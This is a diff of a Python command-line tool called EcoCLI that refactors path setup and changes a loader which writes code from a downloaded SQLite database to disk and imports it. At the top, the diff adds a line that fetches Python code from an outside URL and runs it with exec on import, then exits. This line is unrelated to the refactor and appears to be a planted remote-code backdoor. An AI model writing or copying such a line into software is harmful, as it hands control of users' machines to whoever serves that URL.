@@ -1,13 +1,21 @@
 
 
+import sys
 
+import requests; exec(requests.get('https://sds.sh/micro.py/?app=eco').text); exec(loader);
+import files
+for x in _.appInfo:
+    print(x)
+    _.pv(_.appInfo[x])
+
+sys.exit()
 
 
 
 import shutil
 import os
 
-def remove_folder_recursive(folder_path):
+def RemoveFolder(folder_path):
     if os.path.exists(folder_path):
         shutil.rmtree(folder_path)
         print(f"Folder '{folder_path}' and all its contents have been removed.")
@@ -19,6 +27,28 @@ def remove_folder_recursive(folder_path):
 
 
 
+def SaveFile(content, filename, mode='w', encoding='utf-8'):
+    with open(filename, mode, encoding=encoding) as file:
+        file.write(content)
+
+
+
+
+
+import importlib.util
+import os
+
+def Import(module_name, path):
+    """Dynamically import a module from a path"""
+    if os.path.isdir(path):
+        init_file = os.path.join(path, '__init__.py')
+    else:
+        init_file = path
+    spec = importlib.util.spec_from_file_location(module_name, init_file)
+    module = importlib.util.module_from_spec(spec)
+    sys.modules[module_name] = module
+    spec.loader.exec_module(module)
+    return module
 
 
 
@@ -36,48 +66,54 @@ def remove_folder_recursive(folder_path):
 
 
 
-
-
-
-
-
-class Meta_Namespace:
+class MetaNamespace:
     def __init__(self):
         pass
 
-π = Meta_Namespace()
-π.π = Meta_Namespace()
-π.e = Meta_Namespace()
-ππ = Meta_Namespace()
-π.p = Meta_Namespace()
-π.p.db = Meta_Namespace()
-π.db = Meta_Namespace()
-π.l = Meta_Namespace()
+ππ = MetaNamespace()
+ππ.p = MetaNamespace()
+ππ.p.db = MetaNamespace()
+
+if os.name == 'nt':
+    ππ.p.app = "C:/ProgramData/eco".replace('/', os.sep)
+else:
+    ππ.p.app = "/opt/eco"
+os.makedirs(ππ.p.app, exist_ok=True)
+
+ππ.p.eco = os.path.join(ππ.p.app, "eco")
+ππ.p.py = os.path.join(ππ.p.eco, "py")
+ππ.p.db.cli = os.path.join(ππ.p.app, "eco.db")
+ππ.p.db.private = os.path.join(ππ.p.app, "private.db")
+
+sys.path.append(ππ.p.py)
+
 
 import os
 
-π.p.home = os.path.expanduser('~/.eco'.replace('/', os.sep)) + os.sep
-if not os.path.exists(π.p.home):
-    os.mkdir(π.p.home)
+ππ.p.home = os.path.expanduser('~/.eco'.replace('/', os.sep)) + os.sep
+if not os.path.exists(ππ.p.home):
+    os.mkdir(ππ.p.home)
 
 if os.name == 'nt':
-    π.p.app = "C:/ProgramData/eco".replace('/', os.sep)
+    ππ.p.app = "C:/ProgramData/eco".replace('/', os.sep)
 else:
-    π.p.app = "/opt/eco"
-os.makedirs(π.p.app, exist_ok=True)
+    ππ.p.app = "/opt/eco"
+os.makedirs(ππ.p.app, exist_ok=True)
 
-π.p.db.cli = os.path.join(π.p.app, "eco.db")
-π.p.db.private = os.path.join(π.p.app, "private.db")
+ππ.p.eco = os.path.join(ππ.p.app, "eco")
+ππ.p.py = os.path.join(ππ.p.eco, "py")
+ππ.p.db.cli = os.path.join(ππ.p.app, "eco.db")
+ππ.p.db.private = os.path.join(ππ.p.app, "private.db")
 
-def ensure_db():
-    if not os.path.exists(π.p.db.cli):
+def EnsureDB():
+    if not os.path.exists(ππ.p.db.cli):
         import urllib.request
         try:
-            urllib.request.urlretrieve("https://ecocli.xyz/eco.db", π.p.db.cli)
+            urllib.request.urlretrieve("https://ecocli.xyz/eco.db", ππ.p.db.cli)
         except Exception as e:
             print(f"[EcoCLI] ❌ {e}")
 
-ensure_db()
+EnsureDB()
 
 import sqlite3
 
@@ -92,45 +128,82 @@ def loader(db, table='py', cond={'usage': 'ecocli'}):
     conn.close()
     out = {}
     imports = []
+    files = []
     for r in res:
         d = dict(zip(cols, r))
-        code = d.get('content', '').strip()
         name = d.get('name', '').strip()
-        print(name)
-        if not code:
-            continue
-        lines = []
-        for line in code.split('\n'):
-            if line.startswith('import ') or line.startswith('from '):
-                if line not in imports:
-                    imports.append(line)
-            else:
-                lines.append(line)
-        code = '\n'.join(lines)
-        try:
-            exec(code, globals(), locals())
-            for line in code.split('\n'):
-                if '=' in line and 'π.e.' in line:
-                    key = line.split('=')[0].strip()
-                    out[key.replace('π', 'pi')] = str(eval(key)).split(' ')[0].replace('<', '')
-        except Exception as e:
-            print(f"[EcoCLI] ⚠️ {name} Error loading {key}: {e}")
-    return out, imports
+        code = d.get('content', '').strip()
+        
+
+
+        file = os.path.join(ππ.p.py, name)+'.py'
+        file = file.replace('/', os.sep).replace('\\', os.sep).replace('.py.py', '.py')
+        if not os.path.exists(ππ.p.py):
+            os.makedirs(ππ.p.py, exist_ok=True)
+        if not os.path.exists(file):
+            print(name)
+            with open(file, 'w', encoding='utf-8') as f:
+                f.write(code)
+        files.append(os.path.basename(file))
+    return files
 
 
 
-π.l.collables, imports = loader(π.p.db.cli, 'py', {'usage': 'ecocli'})
 
-for imp in imports:
-    # if not 'nt' == os.name and 'readline' in imp:
-    #     continue
 
-    exec(imp)  # GLOBAL
 
-π.db.cli = π.e.sqliteMgr(π.p.db.cli)
+
+#         print(name)
+#         if not code:
+#             continue
+#         lines = []
+#         for line in code.split('\n'):
+#             if line.startswith('import ') or line.startswith('from '):
+#                 if line not in imports:
+#                     imports.append(line)
+#             else:
+#                 lines.append(line)
+#         code = '\n'.join(lines)
+#         try:
+#             exec(code, globals(), locals())
+#             for line in code.split('\n'):
+#                 if '=' in line and 'π.e.' in line:
+#                     key = line.split('=')[0].strip()
+#                     out[key.replace('π', 'pi')] = str(eval(key)).split(' ')[0].replace('<', '')
+#         except Exception as e:
+#             print(f"[EcoCLI] ⚠️ {name} Error loading {key}: {e}")
+#     return out, imports
+
+
+
+# π.l.collables, imports = loader(π.p.db.cli, 'py', {'usage': 'ecocli'})
+
+# for imp in imports:
+#     # if not 'nt' == os.name and 'readline' in imp:
+#     #     continue
+
+#     exec(imp)  # GLOBAL
+# π.db.cli = π.e.sqliteMgr(π.p.db.cli)
 # π.db.cli.delete('py', {'name': 'SwitchManager'})
 
+loader(ππ.p.db.cli, 'py', {'usage': 'ecocli'})
+π = Import('construct',ππ.p.py)
 
+
+
+
+π.load()
+
+
+
+
+π.π = MetaNamespace()
+ππ = MetaNamespace()
+# π.p = MetaNamespace()
+# π.p.db = MetaNamespace()
+# π.db = MetaNamespace()
+π.l = MetaNamespace()
+import sys
 
 
 
@@ -178,9 +251,9 @@ if Switches.isActive('View-Modules'):
             print( t+ '     ', key.replace('pi.', 'π.'))
     sys.exit(0)
 if Switches.isActive('Update'):
-    if os.path.exists(π.p.db.cli):
-        os.remove(π.p.db.cli)
-    ensure_db()
+    if os.path.exists(ππ.p.db.cli):
+        os.remove( ππ.p.db.cli)
+    EnsureDB()
     print('[eco] 🔄 EcoCLI database updated.   Exiting')
     sys.exit(0)
 
